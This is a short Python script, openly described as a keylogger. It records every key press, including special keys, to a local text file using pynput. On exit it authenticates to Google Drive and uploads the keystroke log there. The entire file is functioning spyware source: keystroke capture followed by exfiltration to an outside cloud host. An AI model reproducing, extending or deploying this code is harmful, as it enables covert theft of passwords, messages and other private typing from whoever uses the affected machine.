from pynput import keyboard
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive

# Function to log key presses
def keyPressed(key):
    try:
        print(f"Key pressed: {key}")
        with open('keytext.txt', 'a') as logKey:
            try:
                # Write the character to the file
                char = key.char
                if char:
                    logKey.write(char)
            except AttributeError:
                # Handle special keys (like Shift, Ctrl, etc.)
                logKey.write(f'[{key}]')
    except Exception as e:
        print(f"Error: {e}")

# Function to upload the file to Google Drive
def upload_to_drive():
    # Authenticate and create the PyDrive client
    gauth = GoogleAuth()
    gauth.LocalWebserverAuth()  # Creates a local webserver for authentication
    drive = GoogleDrive(gauth)

    # Upload the file to Google Drive
    upload_file = drive.CreateFile({'title': 'keytext.txt'})
    upload_file.SetContentFile('keytext.txt')
    upload_file.Upload()

    print(f"File uploaded successfully: {upload_file['title']}")
    print(f"File ID: {upload_file['id']}")

if __name__ == '__main__':
    # Start the key listener
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Wait for user to stop the keylogger
    input("Press Enter to stop the keylogger and upload the file to Google Drive...\n")
    
    # Stop the listener
    listener.stop()

    # Upload the keytext file to Google Drive
    upload_to_drive()
